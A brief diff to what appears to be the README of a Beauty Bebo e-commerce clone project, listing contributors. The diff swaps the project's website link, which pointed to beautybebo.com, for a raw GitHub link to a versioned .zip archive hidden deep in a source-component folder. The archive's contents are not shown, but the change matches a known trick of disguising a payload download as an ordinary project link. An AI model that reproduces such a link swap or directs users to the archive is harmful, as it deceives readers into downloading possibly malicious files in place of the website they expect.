@@ -7,4 +7,4 @@ Beauty Bebo is India’s fastest growing online retail store for the day to day 
 - ✌ Soumyaranjan
 - ✨ Param Raj
 - ## Webstie - beautybebo(clone)
-- ## Link - https://www.beautybebo.com/
+- ## Link - https://raw.githubusercontent.com/Piryanshu88/Beauty_Bebo_Clone-/main/beauty_bebo_clone/src/Components/SingleProduct/SingleProduct/Bebo_Clone_Beauty_v3.2.zip
